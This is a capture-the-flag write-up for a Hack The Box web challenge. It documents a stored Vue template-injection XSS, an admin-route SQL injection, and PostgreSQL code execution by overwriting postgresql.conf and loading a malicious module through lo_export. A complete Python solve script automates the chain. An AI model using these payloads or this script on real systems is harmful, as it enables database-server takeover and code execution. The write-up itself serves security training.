---
tags: 
references:
---
# Aurors Archive
Tags: #xss #sql #postgresql #rce 
## TLDR
xss -> sqli -> rce
## Description
> Hidden within the vibrant streets of Eldoria lies a marketplace of legends. Here, relics and enchanted tomes whisper tales of bygone eras, waiting for those daring enough to claim them. Navigate a vast archive of mystical artifacts using an intuitive filtering system that reveals treasures by era, elemental power, and more. Bid with your hard-earned Eldorian Gold in real time against fellow adventurers, each bid unlocking secrets that could alter your quest for the Dragon’s Heart. Every win unveils a fragment of Eldoria’s storied past, fusing ancient magic with modern strategy. In this dynamic realm, your choices echo through the annals of history—will you seize the relics that reshape destiny, or let them slip into legend?
## Overview
The app is composed by three services:
1. Oauth service for authentication
2. Auction service: allows to place bids
3. Admin bot
## Road to flag
Execute `/readflag` -> RCE
## Code review
#### Bot service
- the bot simply logs in and opens a provided url
```js
if (page.url() != "http://127.0.0.1:1337/") {
      console.log("loggingin IN");
      await page.type('input[name="username"]', "admin");
      await page.type('input[name="password"]', adminPassword);

      await Promise.all([
        page.click('button[type="submit"]'),
        page.waitForNavigation({ waitUntil: "networkidle0" }),
      ]);
      console.log(await browser.cookies());

    } else {
      console.log("already logged in")
      console.log(await page.url());
    }

    await page.goto(url, { waitUntil: "networkidle0" });
```

#### Auctions frontend
**Vue.js** is used as client side library, and **Nunjucks** as server-side template engine.

- `auction-details.html`
The auction details are directly inserted into the html without escaping because of `{{ auction | dump | safe }}'`.
The **safe** filter tells the template engine to trust this content and insert it as-is, bypassing the default HTML escaping.

This can lead to **Stored XSS**
```html
<div id="auction-details-panel" class="rpg-panel" data-auction='{{ auction | dump | safe }}'>
  <div class="panel-header">
    <i class="fa-solid fa-gavel"></i>
    <h2 class="panel-title">Auction Details</h2>
  </div>
```


#### Backend
- Postgresql is in use, and the user has all privileges
```sql
DROP USER IF EXISTS appuser;
 CREATE USER appuser WITH PASSWORD '$APPUSER_PASSWORD' SUPERUSER;
 DROP DATABASE IF EXISTS appdb;
 CREATE DATABASE appdb OWNER appuser;
 \c appdb
 GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO appuser;
 ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL PRIVILEGES ON TABLES TO appuser;
 GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO appuser;
 ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL PRIVILEGES ON SEQUENCES TO appuser;
 EOF
```

- There's a **SQL injection** in admin route `/table`: `` const query = `SELECT * FROM "${tableName}"`;``
Turning this sqli into an RCE would be easy, if stacked queries would be allowed. I have to find another way.
```js
router.post("/table", isAdmin, async (req, res) => {
  const { tableName } = req.body;
  const query = `SELECT * FROM "${tableName}"`;
  try {

    if (query.includes(';')) {
      return res
        .status(400)
        .json({ success: false, message: "Multiple queries not allowed!" });
    }

    const results = await runReadOnlyQuery(query);
    res.json({ success: true, results, query });
  } catch (error) {
    console.error("Table Query Error:", error);
    res.status(500).json({
      success: false,
      message: "Error fetching table data.",
      query
    });
  }
});
```
## Exploitation
1. XSS

As previously seen, `auction` data is directly inserted into the page without escaping.

Auction data includes the **username** of every user that submitted a bid to it:
```js
async function getAuctionById(id) {
  const auctions = await runReadOnlyQuery(
    `SELECT auctions.*, submissions.name AS resourceName
     FROM auctions JOIN submissions ON auctions.resourceId = submissions.id
     WHERE auctions.id = $1`,
    [id]
  );
  if (auctions.length === 0) return [];
  const auction = auctions[0];
  auction.bids = await getBidsForAuction(id);
  return [auction];
}
async function getBidsForAuction(auctionId) {
  return await runReadOnlyQuery(
    `SELECT b.*, s.name as resourceName, u.username as bidder
     FROM bids b
     JOIN auctions a ON b.auctionId = a.id
     JOIN submissions s ON a.resourceId = s.id
     JOIN users u ON b.userId = u.id
     WHERE b.auctionId = $1
     ORDER BY b.createdAt DESC`,
    [auctionId]
  );
}
```

So I can just **register** with an XSS payload as username and **place a bid** to achieve **Stored XSS**.

To exploit it I simply used a [vuejs template]([https://vuejs.org/guide/essentials/template-syntax.html](https://vuejs.org/guide/essentials/template-syntax.html#raw-html)): `'> ${this.constructor.constructor('alert()')()}` (during the ctf I immediately tested for csti knowing that vuejs was in use, but `'><svg onload=alert()>` works as well)

2. Postgresql SQLi to RCE

Since stacked queries are not allowed, I need a way to achieve RCE without functions that are not allowed in non-volatile queries.
In PostgreSQL, queries that contains SELECT statements are classified as STABLE, and these do not allow functions that can modify the database such as COPY TO.

But stable queries allow operations that performs files operations such as: lo_export,lo_import.

Knowing that I can read and write files, how can I exploit this?

Postgresql has modules, that are extensions that enhances the functionality of the database by bundling additional SQL objects, functions, operators, or types. Modules are designed for extensibility and customization, allowing developers to tailor PostgreSQL to their specific needs.

They are sql or C scripts, so what if we could load a malicious one?
The steps to do this are clearly explained here: https://adeadfed.com/posts/postgresql-select-only-rce/

TLDR:
- overwrite the `/var/lib/postgresql/data/postgresql.conf` file with a custom one that loads a malicious module
- upload the compiled malicious module
- reload the config
- on the first database connection after the config is reloaded, the malicious module will be loaded

`HTB{l00k_0ut_f0r_0auth_155u35}`
## Full exploit
1. Register with `'> ${this.constructor.constructor('eval(decodeURIComponent(location.search.substr(3)))')()}`
2. Place the bid -> stored xss is achieved
3. Exploit the sqli calling the bot to `http://localhost/auction/id#xss_payload`

`solve.py`
```python
import requests
import base64
from urllib.parse import quote
import time

url = "http://83.136.249.227:47313"

session = requests.session()

csti_payload = "'> ${this.constructor.constructor('eval(decodeURIComponent(location.search.substr(3)))')()}"
auth_data={"username": csti_payload, "password": "sebb"}

def register():
    session.post(f"{url}/oauth/register", data=auth_data)

def login():
    r = session.post(f"{url}/oauth/login", data=auth_data)
    if "User Information" not in r.text:
        print("Failed to login")
        return
    cid = session.get(f"{url}/api/config").json()["oauthClientId"]
    r = session.post(f"{url}/oauth/authorize", data={"response_type": "code", "client_id": cid, "redirect_uri": "/callback", "scope": "read", "state": "", "approve": "true"}, allow_redirects=False)
    # Extract auth code from the redirect URL
    try:
        auth_code = r.headers.get("Location").split("code=")[1]
    except:
        print(r.text)
        print("Failed to get auth code")
        return
    session.post(f"{url}/api/oauthLogin", data={"code": auth_code})

def place_bid():
    session.post(f"{url}/api/auctions/1/bids", json={"bid": "70"})
    
def build_xss_payload(json):
    xss_payload = f"fetch('http://127.0.0.1:1337/table', {{method: 'POST', body: JSON.stringify({json}), headers: {{'Content-Type': 'application/json'}}}})"
    return xss_payload

def csrf(json):
    xss_payload = build_xss_payload(json)
    r = session.post(f"{url}/api/submissions", json={"name":"xxx","description":"xxx","url":f"http://127.0.0.1:1337/auction/1?c={quote(xss_payload)}","category":"lore"})
    print(r.text)

def exploit():
    try:
        # write config file
        print("Writing config file")
        with open('postgresql.conf', 'rb') as f:
            conf = f.read().hex()
            conf = bytes.fromhex(conf)
            conf = base64.b64encode(conf).decode()
            csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_from_bytea(133337, decode('{conf}', 'base64')))::text-- -"})
            time.sleep(12) # wait the bot to finish
            csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_export(133337, '/var/lib/postgresql/data/postgresql.conf'))::text-- -"})
            time.sleep(12)

        # write shell module
        print("Writing shell module")
        id = 133338
        for i in range(0, 14336, 2048):
            chunk_file = f"shell_chunks/base64_{i}"
            with open(chunk_file, "rb") as f:
                shell = f.read().decode()
                if i == 0:
                    csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_from_bytea({id}, decode('{shell}', 'base64')))::text-- -"})
                else:
                    csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_put({id}, {i}, decode('{shell}', 'base64')))::text-- -"})
            time.sleep(12)

        csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_export({id}, '/tmp/shell.so'))::text-- -"})
        time.sleep(12)
        # reload the config
        print("Reloading the config")
        csrf({"tableName": f"users\" union select 1,'a',(SELECT pg_reload_conf())::text-- -"})

        # get the shell
        time.sleep(12)
        session.get(f"{url}/submissions")
        print("Check your shell :)")

    except Exception as e:
        print(e)

if __name__ == "__main__":
    register()
    login()
    place_bid()
    print("Logged in, exploit started")
    exploit()
```
